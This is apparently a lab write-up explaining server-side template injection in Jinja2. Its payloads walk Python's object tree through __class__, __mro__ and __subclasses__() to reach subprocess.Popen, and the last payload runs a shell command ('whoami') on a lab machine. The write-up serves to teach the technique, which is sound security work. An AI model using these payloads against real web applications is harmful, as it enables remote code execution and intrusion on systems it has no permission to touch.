# POC Jinja
### The basic syntax of templates

The official document introduces the syntax of the template as follows

```text-plain
{% ... %} for Statements

{{ ... }} for Expressions to print to the template output

{# ... #} for Comments not included in the template output

#  ... ## for Line Statements
```

**Crafting a proof of concept (Jinja2)**

Python allows us to call the current class instance with [.\_\_class\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__), we can call this on an empty string:

Payload: `http://MACHINE_IP:5000/profile/{{ ''.__class__ }}`.

Classes in Python have an attribute called [.\_\_mro\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__) that allows us to climb up the inherited object tree:

Payload: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__ }}`.

Since we want the root object, we can access the second property (first index):

Payload: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1] }}`.

Objects in Python have a method called [.\_\_subclassess\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__) that allows us to climb down the object tree:

Payload: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}`.

Now we need to find an object that allows us to run shell commands. Doing a Ctrl-F for the modules in the code above yields us a match:

![](POC%20Jinja/ChOoCyq.png)

As this whole output is just a Python list, we can access this by using its index. You can find this by either trial and error, or by counting its position in the list.

In this example, the position in the list is 400 (index 401):

Payload: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}`.

The above payload essentially calls the **subprocess.Popen** method, now all we have to do is invoke it (use the code above for the syntax)  
 

Payload: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}`